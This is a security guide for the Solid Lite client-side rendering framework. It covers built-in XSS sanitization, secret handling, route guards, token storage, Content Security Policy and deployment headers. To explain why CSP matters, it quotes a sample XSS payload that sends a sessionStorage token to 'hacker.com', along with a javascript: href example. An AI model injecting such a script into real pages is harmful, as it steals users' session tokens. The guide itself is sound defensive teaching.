# Security Guide

Solid Lite is a Client-Side Rendering (CSR) framework. Its application code runs entirely in the browser — a public and inherently untrusted environment. This guide is split into two parts: what the framework already handles for you, and what you are responsible for when building on top of it.

> **Note:** Security risks exist in all architectures. The [Vercel April 2026 incident](https://vercel.com/kb/bulletin/vercel-april-2026-security-incident), where environment variables were compromised through internal system access, proves that storing secrets server-side doesn't eliminate risk—it just shifts it. Vigilance remains essential regardless of your rendering strategy.

---

## What Solid Lite Already Protects You From

### XSS via `<Link />`

The `<Link />` component sanitizes `href` values before rendering. Any attempt to inject `javascript:`, `data:`, or `vbscript:` protocols is silently redirected to `about:blank`.

```tsx
// This will render as href="about:blank" — the click does nothing harmful
<Link href="javascript:alert('xss')">Click me</Link>;
```

### XSS via `dangerouslySetInnerHTML`

When you use `dangerouslySetInnerHTML`, the HTML string is parsed through the browser's native `DOMParser` before being injected. The sanitization pipeline:

- Removes all `<script>` tags.
- Strips inline event attributes (`onclick`, `onload`, `onerror`, etc.).
- Replaces malicious `href` and `src` values (`javascript:`, `data:`, `vbscript:`) with `about:blank`.

> [!NOTE]
> Unlike many popular frameworks (e.g., React, which provides the property name as a warning but does no automatic sanitization), Solid Lite includes this built-in protection by default. This covers 99% of common attack vectors while keeping the framework lightweight. However, you should still avoid using this feature with raw user input.

### Event Delegation Cleanup

Event handlers registered via props (e.g., `onClick`) are attached through a delegation system and automatically removed via `onCleanup` when a component is unmounted. This prevents stale listeners from leaking between route navigations.

---

## What You Are Responsible For

### 1. Never Embed Secrets in Client Code

Everything that ships to the browser is readable by anyone. Do not place API keys, private tokens, or sensitive configuration directly in any file processed by the bundler.

```ts
// Visible to any user who opens DevTools — never do this
const API_KEY = "sk-live-abc123";
```

**Do this instead:** Keep secrets on your backend and expose only the data the client needs through a server-side endpoint. Use environment variables on the server — never in any file processed by the bundler.

### 2. The Browser is Not a Security Boundary

Client-side route guards (like `useAuthGuard`) are a **UX convenience**, not a security mechanism. They prevent a regular user from seeing a "broken" UI, but they can be easily bypassed by anyone with DevTools knowledge.

> [!IMPORTANT]
> **Security TODO:** Think of route guards as a visual guide. **Real security must happen on the server.** Your API endpoints must validate tokens and permissions on every request. If your API is public and unprotected, a client-side guard is effectively useless against a determined attacker.

### 3. Token Storage

If your application implements authentication, choose the storage mechanism carefully:

| Storage           | Persistence       | XSS Risk | Notes                            |
| ----------------- | ----------------- | -------- | -------------------------------- |
| `localStorage`    | Until cleared     | High     | Avoid for auth tokens            |
| `sessionStorage`  | Tab lifetime      | Medium   | Acceptable; cleared on tab close |
| `HttpOnly Cookie` | Server-controlled | Low      | Best option; requires a backend  |

`sessionStorage` limits the exposure window — a stolen token is gone when the tab closes. If your backend supports it, prefer `HttpOnly` cookies.

### 4. Content Security Policy (CSP)

A CSP restricts which scripts, styles, and resources the browser is allowed to load — even if an attacker manages to inject a `<script>` tag. Configure it on your server or in `index.html`:

```html
<!-- Example: Basic CSP that allows Google Fonts and inline styles (needed for Solid Lite reactivity) -->
<meta
  http-equiv="Content-Security-Policy"
  content="default-src 'self'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src https://fonts.gstatic.com; img-src 'self' data:;"
>
```

> [!TIP]
> If your application needs to load resources from external domains, you must explicitly add them. For example, to allow images from Pexels, update the `img-src` directive:
> `img-src 'self' data: https://images.pexels.com;`

#### Why this matters:

Without a CSP, the browser is "trusting" and will execute any JavaScript it finds in the HTML. If an attacker manages to inject a malicious script (XSS), they could steal sensitive data:

1. **The Attack:** `<script>fetch('https://hacker.com?token=' + sessionStorage.getItem('token'))</script>`
2. **The Defense:** With the CSP above, the browser will block the request to `hacker.com` because it's not in the allowed list, preventing the token from being stolen even if the script was successfully injected.

Start restrictive and loosen only where necessary. A well-configured CSP is one of the most effective defenses against XSS.

### 5. Dependency Hygiene

Solid Lite has zero runtime dependencies. When you add packages to your project, apply these rules:

- Pin versions explicitly in `deno.json`; avoid open-ended ranges in production.
- Prefer `jsr:` packages or well-maintained `npm:` packages.
- Audit your dependency tree periodically for known vulnerabilities.

### 6. Deployment & Hosting

- **Directory Listing:** Ensure your `dist/` directory is not served with directory listing enabled to prevent discovery of your file structure.
- **Cache Policy:** Serve `index.html` with `Cache-Control: no-store` to ensure users always receive the latest version.
  - _Note:_ Be aware that `no-store` disables [bfcache](https://web.dev/bfcache/), which may cause a brief login-screen flash on back navigation in SPAs. Weigh this UX trade-off before applying.
- **Content Hashing:** Static assets (`.js`, `.css`) with content hashes in their filenames can and should be cached aggressively (e.g., `Cache-Control: max-age=31536000, immutable`).

---

## Quick Checklist

- [ ] **No Secrets:** No API keys or private tokens in any client-side file (source or bundler output).
- [ ] **Server-Side Auth:** Authorization is enforced on the API level, not just in route guards.
- [ ] **Token Safety:** Auth tokens are stored in `sessionStorage` or `HttpOnly` cookies.
- [ ] **Headers:** Production-ready CSP and security headers (HSTS, X-Frame-Options) are configured.
- [ ] **Sanitization:** `dangerouslySetInnerHTML` is avoided or used only with trusted data.
- [ ] **Maintenance:** Dependencies are audited and the `index.html` cache policy has been reviewed.
